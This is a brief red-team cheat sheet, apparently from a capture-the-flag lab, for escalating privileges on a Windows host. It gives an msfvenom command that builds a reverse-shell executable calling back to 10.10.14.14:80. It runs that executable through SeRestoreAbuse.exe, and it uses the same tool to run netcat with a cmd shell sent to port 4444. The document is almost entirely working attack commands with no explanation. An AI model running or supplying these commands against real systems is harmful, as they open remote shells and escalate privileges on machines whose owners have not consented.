## File
`https://github.com/dxnboy/redteam`

## exec
#### execute PE
- ready
  `msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.14 LPORT=80 -f exe -o reverse.exe`
- exec
  `.\SeRestoreAbuse.exe 'C:\Users\emily.oscars.CICADA\Documents\reverse.exe'`
#### nc
`.\SeRestoreAbuse.exe '.\nc.exe 10.10.14.14 4444 -e cmd'`
